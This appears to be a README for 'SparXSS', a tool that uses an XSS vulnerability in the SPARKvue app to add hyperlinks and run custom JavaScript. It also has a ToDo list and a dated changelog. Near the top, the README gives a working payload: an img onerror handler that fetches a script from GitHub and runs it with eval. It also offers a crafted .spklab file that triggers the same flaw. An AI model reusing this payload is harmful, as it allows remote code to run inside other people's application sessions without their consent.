## A JS Script For Redirection And Custom Javascript Execution For The SPARKvue XSS Vulnerability Found By ohonbob

Run it using:
```
<img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
```

Or Download The SparXSS.spklab File And Select 'Open Saved Experiment' When You Open The App

## ToDo
- ~~Make Icon's Show up for Every URL~~
- ~~Make the custom URL's stay when you export the .spklab file~~<br>
  (currently working, may be changed in the future- change the link from /sparxss.js to /Testing/test4.js to use)
- May add a tabbing feature to the javascript, but this is not a final decision

## Changelog

10/27/2023
- Added a third button in the hyperlinks menu that lets you copy the text in the textbox, so you can keep adding links incase you either dont want to export the file, or want to keep adding links<br>
  If you do hit the copy button, all you have to do is paste the stuff copied to your clipboard in the textbox when reopening the app
- Added cancel feature to the menu that you type the hyper link URL's in

10/26/2023
- Found out you have to click the textbox to update it before exporting to make the links actually save
- Made the javascript box load with the script instead of everytime the button is clicked

10/25/2023
- Basic link saving functionality added
- The hyperlink button now accepts pressing enter to add a hyperlink

10/24/2023
- The checkpoint2 and getFaviconUrl functions have been combined into 1 function (only checkpoint2 now)
- The Hyperlink URL can now have https:// when it could not before
- Uploaded New SparXSS.spklab file to reflect the updates made so far
